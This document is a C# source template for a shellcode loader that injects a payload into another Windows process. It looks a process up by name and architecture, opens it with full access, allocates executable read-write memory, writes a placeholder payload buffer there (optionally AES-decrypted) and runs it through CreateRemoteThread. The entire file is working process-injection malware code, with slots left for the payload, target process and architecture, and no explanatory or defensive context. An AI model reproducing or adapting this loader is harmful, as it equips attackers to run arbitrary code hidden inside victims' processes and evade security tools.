using System;
using System.Runtime.InteropServices;
using System.Diagnostics; 
#if AES
using System.Security.Cryptography;
#endif

namespace Craft
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;
        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
    
        public static void Main()
        {
            {{PAYLOAD}}

            int pid = -1;
            foreach (var proc in Process.GetProcessesByName("{{PROCESS}}"))
            {
                bool isWow64;
                if (IsWow64Process(proc.Handle, out isWow64) && isWow64 == {{ARCH}})
                {
                    pid = proc.Id;
                    break;
                }
            }
            if (pid == -1) {
                return;
            }
            
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}